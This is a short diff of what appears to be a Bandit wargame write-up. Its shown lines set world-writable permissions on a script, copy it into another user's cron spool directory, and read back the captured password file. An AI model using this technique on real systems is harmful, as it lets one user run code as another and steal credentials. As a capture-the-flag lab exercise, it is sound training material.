@@ -24,5 +24,6 @@ chmod 666 /tmp/my_dir/password.txt
 ##Set Permissions & Execute
 chmod 777 /tmp/my_dir/script.sh
 cp /tmp/my_dir/script.sh /var/spool/bandit24/foo/
-Retrieve Flag
+##Retrieve Flag
 Waited 60 seconds and read the output:
+cat /tmp/my_dir/password.txt
